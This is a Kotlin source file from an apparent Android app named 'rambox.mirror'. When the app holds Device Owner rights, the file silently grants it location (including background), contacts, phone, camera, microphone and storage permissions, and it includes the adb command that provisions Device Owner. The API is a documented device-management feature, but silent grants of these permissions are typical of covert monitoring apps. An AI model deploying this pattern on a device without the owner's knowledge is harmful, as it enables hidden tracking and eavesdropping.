package com.rambox.mirror

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.util.Log

object PrivilegeBootstrap {

    private const val TAG = "RamboxPriv"

    data class Report(
        val deviceOwner: Boolean,
        val profileOwner: Boolean,
        val granted: List<String>,
        val failed: List<String>,
        val message: String
    ) {
        val isPrivileged: Boolean get() = deviceOwner && granted.isNotEmpty()
    }

    val runtimePermissions: List<String> = listOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.POST_NOTIFICATIONS,
        Manifest.permission.READ_MEDIA_IMAGES,
        Manifest.permission.READ_MEDIA_VIDEO,
        Manifest.permission.READ_MEDIA_AUDIO
    )

    val permissionGroups: List<String> = listOf(
        "android.permission-group.LOCATION",
        "android.permission-group.CONTACTS",
        "android.permission-group.PHONE",
        "android.permission-group.CAMERA",
        "android.permission-group.RECORD_AUDIO",
        "android.permission-group.MICROPHONE",
        "android.permission-group.STORAGE",
        "android.permission-group.NOTIFICATIONS"
    )

    fun isDeviceOwner(context: Context): Boolean {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
            ?: return false
        return dpm.isDeviceOwnerApp(context.packageName)
    }

    fun isProfileOwner(context: Context): Boolean {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
            ?: return false
        return dpm.isProfileOwnerApp(context.packageName)
    }

    fun grantSilentPermissions(context: Context): Report {
        val appContext = context.applicationContext
        val pkg = appContext.packageName
        val dpm = appContext.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
            ?: return Report(false, false, emptyList(), emptyList(), "DevicePolicyManager tidak tersedia")
        val admin = ComponentName(appContext, RamboxDeviceAdminReceiver::class.java)

        val isDo = dpm.isDeviceOwnerApp(pkg)
        val isPo = dpm.isProfileOwnerApp(pkg)
        if (!isDo && !isPo) {
            return Report(
                false, false, emptyList(), emptyList(),
                "Belum Device Owner. Provisioning (ADB): adb shell dpm set-device-owner $pkg/.RamboxDeviceAdminReceiver"
            )
        }

        val granted = mutableListOf<String>()
        val failed = mutableListOf<String>()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            for (group in permissionGroups) {
                try {
                    dpm.setPermissionGrantState(
                        admin, pkg, group,
                        DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED
                    )
                    granted += group
                } catch (e: Exception) {
                    failed += "$group(${e.javaClass.simpleName})"
                }
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            for (perm in runtimePermissions) {
                try {
                    dpm.setPermissionGrantState(
                        admin, pkg, perm,
                        DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED
                    )
                    granted += perm
                } catch (e: Exception) {
                    failed += "$perm(${e.javaClass.simpleName})"
                }
            }
        }

        val message = "Silent permissions: ${granted.size} granted, ${failed.size} failed"
        Log.i(TAG, message)
        return Report(isDo, isPo, granted, failed, message)
    }
}
